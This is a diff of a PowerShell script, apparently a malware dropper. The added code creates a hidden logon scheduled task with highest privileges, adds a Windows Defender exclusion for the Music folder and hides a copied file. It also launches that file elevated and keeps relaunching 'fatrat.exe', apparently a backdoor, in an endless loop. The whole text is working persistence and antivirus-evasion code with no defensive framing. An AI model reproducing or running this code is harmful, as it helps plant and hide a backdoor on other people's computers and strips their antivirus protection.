@@ -1,12 +1,18 @@
+function Do-A {
+
+    schtasks /create /tn "Script2Task" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\System32\script2.ps1" /sc onlogon /rl highest /f
 
 
-$path = Join-Path $env:USERPROFILE "Music\fatrat.exe"
+    while ($true) {
+    Start-Process "$env:USERPROFILE\Music\fatrat.exe"
+    Start-Sleep -Seconds 30
+}
 
-if (Test-Path $path) {
-    Remove-Item $path -Force
-} 
+}
 
-
+function Do-B {
+    
+    $path = Join-Path $env:USERPROFILE "Music\fatrat.exe"
 Add-MpPreference -ExclusionPath "$env:USERPROFILE\Music"
 Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 
@@ -20,12 +26,14 @@ Set-ItemProperty -Path $dest -Name Attributes -Value Hidden
 Start-Process -FilePath $dest -Verb RunAs   
 
 
-
-while ($true) {
-    Start-Process "$env:USERPROFILE\Music\fatrat.exe"
-    Start-Sleep -Seconds 18
 }
 
+$path = Join-Path $env:USERPROFILE "Music\fatrat.exe"
 
-
-
+if (Test-Path $path) {
+    Do-A
+}
+else {
+    Do-B
+    Do-A
+}
